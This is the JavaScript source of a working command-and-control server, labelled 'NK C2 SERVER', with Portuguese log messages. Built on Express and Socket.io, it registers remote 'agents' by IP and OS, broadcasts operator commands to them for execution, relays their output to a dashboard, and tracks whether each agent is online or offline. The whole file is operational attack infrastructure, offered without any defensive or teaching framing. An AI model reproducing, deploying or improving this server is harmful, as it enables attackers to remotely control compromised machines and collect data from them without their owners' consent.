/* NK C2 SERVER v42.1 - STATEFUL CORE */
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
app.use(cors());
app.get('/', (req, res) => res.json({ 
    status: 'ONLINE', 
    agents: Array.from(agentsMap.values()).length 
}));

const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*" },
    pingTimeout: 30000,
    pingInterval: 10000
}); 

// PERSISTENT STATE
const agentsMap = new Map();

io.on('connection', (socket) => {
    const clientIp = socket.handshake.address.replace('::ffff:', '');
    console.log(`[CONN] NOVA CONEXAO: ${socket.id} (${clientIp})`);

    // Send current list to anyone who connects (Front or Agents)
    socket.emit('status', { agents: Array.from(agentsMap.values()) });

    socket.on('identify', (data) => {
        if (data.type === 'agent') {
            const agentInfo = {
                id: data.id,
                ip: clientIp,
                os: data.os || 'UNKNOWN',
                status: 'ONLINE',
                lastSeen: Date.now(),
                socketId: socket.id
            };
            
            // Update Map
            agentsMap.set(data.id, agentInfo);
            
            console.log(`[+] AGENTE REGISTRADO: ${data.id}`);
            
            // Broadcast update to everyone (especially the Dashboard)
            io.emit('status', { agents: Array.from(agentsMap.values()) });
            io.emit('log', `[SYSTEM] AGENTE CONECTADO: ${data.id}`);
        }
    });

    socket.on('cmd', (data) => {
        console.log(`[CMD] REPASSANDO COMANDO: ${data.cmd}`);
        // Broadcast to ALL sockets (Agents will filter by ID if needed)
        io.emit('exec', data); 
        io.emit('log', `[C2] ORDEM ENVIADA: ${data.cmd}`);
    });

    socket.on('stream_log', (data) => {
        // console.log(`[LOG] ${data.output}`); // Optional: unclutter server logs
        io.emit('log', data);
        
        // Update "lastSeen" for the agent sending logs
        if (data.from && agentsMap.has(data.from)) {
            const agent = agentsMap.get(data.from);
            agent.lastSeen = Date.now();
            agent.status = 'ONLINE';
            agentsMap.set(data.from, agent);
            io.emit('status', { agents: Array.from(agentsMap.values()) });
        }
    });

    socket.on('disconnect', () => {
        // Find agent by socket ID to mark as offline
        for (let [id, agent] of agentsMap.entries()) {
            if (agent.socketId === socket.id) {
                console.log(`[-] AGENTE PERDIDO: ${id}`);
                agent.status = 'OFFLINE';
                agentsMap.set(id, agent);
                io.emit('status', { agents: Array.from(agentsMap.values()) });
                break;
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`[*] C2 OPERACIONAL NA PORTA ${PORT}`));